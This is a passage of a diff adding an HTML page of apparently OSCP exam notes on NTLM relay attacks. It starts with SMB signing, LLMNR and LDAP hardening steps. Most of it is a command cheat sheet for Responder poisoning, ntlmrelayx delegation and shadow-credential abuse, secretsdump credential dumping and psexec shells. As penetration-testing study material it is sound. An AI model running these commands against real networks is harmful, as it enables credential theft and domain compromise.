+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>- Ensure Responder is running first
+</span></code></pre></div></p>
+<hr />
+<h2 id="defense-and-mitigation">Defense and Mitigation</h2>
+<h3 id="enable-smb-signing">Enable SMB Signing</h3>
+<p><strong>Via Group Policy:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; 
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>Security Settings -&gt; Local Policies -&gt; Security Options
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>Set:
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>- &quot;Microsoft network client: Digitally sign communications (always)&quot; = Enabled
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>- &quot;Microsoft network server: Digitally sign communications (always)&quot; = Enabled
+</span></code></pre></div></p>
+<p><strong>Via Registry:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> <span class="p">`</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>  <span class="n">-Name</span> <span class="s2">&quot;RequireSecuritySignature&quot;</span> <span class="n">-Value</span> <span class="n">1</span>
+</span></code></pre></div></p>
+<h3 id="disable-llmnr-and-nbt-ns">Disable LLMNR and NBT-NS</h3>
+<p><strong>Disable LLMNR via Group Policy:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>Computer Configuration -&gt; Administrative Templates -&gt; 
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>Network -&gt; DNS Client -&gt; Turn off multicast name resolution = Enabled
+</span></code></pre></div></p>
+<p><strong>Disable NBT-NS:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nv">$adapters</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">Win32_NetworkAdapterConfiguration</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nv">$adapters</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">SetTcpipNetbios</span><span class="p">(</span><span class="n">2</span><span class="p">)</span> <span class="p">}</span>
+</span></code></pre></div></p>
+<h3 id="enable-ldap-signing-and-channel-binding">Enable LDAP Signing and Channel Binding</h3>
+<p><strong>LDAP Signing:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; 
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>Security Settings -&gt; Local Policies -&gt; Security Options
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>&quot;Domain controller: LDAP server signing requirements&quot; = Require signing
+</span></code></pre></div></p>
+<hr />
+<h2 id="advanced-techniques">Advanced Techniques</h2>
+<h3 id="ntlm-relay-with-delegation">NTLM Relay with Delegation</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Relay and configure resource-based constrained delegation</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="w">  </span>--delegate-access<span class="w"> </span>--escalate-user<span class="w"> </span>hacker
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="c1"># Use the delegated access</span>
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/target.domain.local<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>domain.local/hacker$
+</span></code></pre></div>
+<h3 id="relay-with-shadow-credentials">Relay with Shadow Credentials</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># Relay and add shadow credentials</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="w">  </span>--shadow-credentials<span class="w"> </span>--shadow-target<span class="w"> </span>target$
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="c1"># Use the certificate to authenticate</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>python3<span class="w"> </span>gettgtpkinit.py<span class="w"> </span>-pfx-base64<span class="w"> </span>&lt;base64_cert&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="w">  </span>domain.local/target$<span class="w"> </span>target.ccache
+</span></code></pre></div>
+<h3 id="multi-relay-attack">Multi-Relay Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Setup multiple ntlmrelayx instances</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>smb_targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i<span class="w"> </span><span class="p">&amp;</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://dc01.domain.local<span class="w"> </span>--escalate-user<span class="w"> </span>hacker<span class="w"> </span><span class="p">&amp;</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="c1"># Start Responder</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-dwv
+</span></code></pre></div>
+<hr />
+<h2 id="quick-reference-commands">Quick Reference Commands</h2>
+<h3 id="essential-commands">Essential Commands</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># 1. Scan for vulnerable targets</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>targets.txt
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1"># 2. Configure Responder (SMB=Off, HTTP=Off)</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/responder/Responder.conf
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1"># 3. Start Responder</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-dwv
+</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>
+</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1"># 4. Start ntlmrelayx (basic)</span>
+</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support
+</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>
+</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="c1"># 5. Start ntlmrelayx (interactive shell)</span>
+</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i
+</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a>
+</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="c1"># 6. Start ntlmrelayx (SOCKS proxy)</span>
+</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-socks
+</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a>
+</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a><span class="c1"># 7. Connect to interactive session</span>
+</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a>nc<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">11000</span>
+</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a>
+</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#__codelineno-50-22"></a><span class="c1"># 8. Dump credentials after relay</span>
+</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#__codelineno-50-23"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@target&#39;</span>
+</span><span id="__span-50-24"><a id="__codelineno-50-24" name="__codelineno-50-24" href="#__codelineno-50-24"></a>
+</span><span id="__span-50-25"><a id="__codelineno-50-25" name="__codelineno-50-25" href="#__codelineno-50-25"></a><span class="c1"># 9. Verify access</span>
+</span><span id="__span-50-26"><a id="__codelineno-50-26" name="__codelineno-50-26" href="#__codelineno-50-26"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>target<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-50-27"><a id="__codelineno-50-27" name="__codelineno-50-27" href="#__codelineno-50-27"></a>
+</span><span id="__span-50-28"><a id="__codelineno-50-28" name="__codelineno-50-28" href="#__codelineno-50-28"></a><span class="c1"># 10. Get shell</span>
+</span><span id="__span-50-29"><a id="__codelineno-50-29" name="__codelineno-50-29" href="#__codelineno-50-29"></a>psexec.py<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password@target&#39;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="cheat-sheet-summary">Cheat Sheet Summary</h2>
+<h3 id="pre-attack-checklist">Pre-Attack Checklist</h3>
+<ul>
+<li>[ ] Identify targets without SMB signing</li>
+<li>[ ] Locate domain controllers</li>
+<li>[ ] Configure Responder (disable SMB/HTTP)</li>
+<li>[ ] Prepare targets.txt file</li>
+<li>[ ] Ensure network connectivity</li>
+</ul>
+<h3 id="attack-flow">Attack Flow</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>1. Start Responder → 2. Start ntlmrelayx → 3. Wait for auth → 4. Relay → 5. Exploit
+</span></code></pre></div>
+<h3 id="key-ntlmrelayx-options">Key ntlmrelayx Options</h3>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-tf targets.txt</code></td>
+<td>Target file</td>
+</tr>
+<tr>
+<td><code>-t &lt;target&gt;</code></td>
+<td>Single target</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>Enable SMB2/3 support</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>Interactive shell</td>
+</tr>
+<tr>
+<td><code>-socks</code></td>
+<td>SOCKS proxy</td>
+</tr>
+<tr>
+<td><code>-c "command"</code></td>
+<td>Execute command</td>
+</tr>
+<tr>
+<td><code>--escalate-user</code></td>
+<td>LDAP privilege escalation</td>
+</tr>
+<tr>
+<td><code>-6</code></td>
+<td>IPv6 support (with mitm6)</td>
+</tr>
+<tr>
+<td><code>-wh &lt;host&gt;</code></td>
+<td>WPAD host</td>
+</tr>
+</tbody>
+</table>
+<h3 id="post-exploitation-tools">Post-Exploitation Tools</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>secretsdump.py<span class="w">    </span><span class="c1"># Dump credentials</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>psexec.py<span class="w">         </span><span class="c1"># Get SYSTEM shell</span>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>wmiexec.py<span class="w">        </span><span class="c1"># WMI execution</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>smbexec.py<span class="w">        </span><span class="c1"># SMB execution</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>atexec.py<span class="w">         </span><span class="c1"># AT scheduler execution</span>
+</span></code></pre></div>
+<hr />
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket Documentation</a></li>
+<li><a href="https://github.com/lgandx/Responder">Responder GitHub</a></li>
+<li><a href="https://github.com/dirkjanm/mitm6">mitm6 Documentation</a></li>
+<li><a href="https://wiki.porchetta.industries/">CrackMapExec Wiki</a></li>
+<li><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">NTLM Relay Attacks Explained</a></li>
+<li><a href="https://adsecurity.org/">Active Directory Security Blog</a></li>
+</ul>
+<hr />
+<h2 id="oscp-exam-notes">OSCP Exam Notes</h2>
+<div class="admonition warning">
+<p class="admonition-title">Important</p>
+<ul>
+<li>NTLM Relay attacks are <strong>time-dependent</strong> - be patient</li>
+<li>Always check SMB signing status first</li>
+<li>Have alternative attack vectors ready</li>
+<li>Document all relayed sessions and credentials</li>
+<li>Practice in labs before exam</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Pro Tips</p>
+<ul>
+<li>Use <code>-i</code> flag for interactive shells - more control</li>
+<li>SOCKS proxy is powerful for pivoting</li>
+<li>mitm6 can be more effective than Responder in some networks</li>
+<li>Always try LDAPS relay to DC if possible - can grant DCSync rights</li>
+<li>Keep ntlmrelayx running throughout entire exam period</li>
+</ul>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">Exam Restrictions</p>
+<ul>
+<li>Ensure your attacks are only targeting exam machines</li>
+<li>Do not perform DoS attacks</li>
+<li>Follow exam guidelines regarding automated tools</li>
+<li>Document methodology for report</li>
+</ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
